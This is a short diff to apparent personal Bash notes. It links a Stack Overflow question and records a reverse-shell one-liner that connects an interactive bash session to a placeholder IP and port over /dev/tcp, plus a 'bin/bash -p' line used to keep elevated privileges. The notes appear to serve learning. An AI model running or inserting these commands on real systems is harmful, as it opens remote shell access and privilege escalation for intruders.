@@ -1,4 +1,7 @@
 Bash
 Supporting Link : https://stackoverflow.com/questions/76899269/can-someone-explain-how-does-this-command-works-bash-i-dev-tcp-ip-port
 
-bash -i >& /dev/tcp/<IP Address>/<Port> 0>&1. 
+bash -i >& /dev/tcp/<IP Address>/<Port> 0>&1
+
+bin/bash -p : execute the bash
+
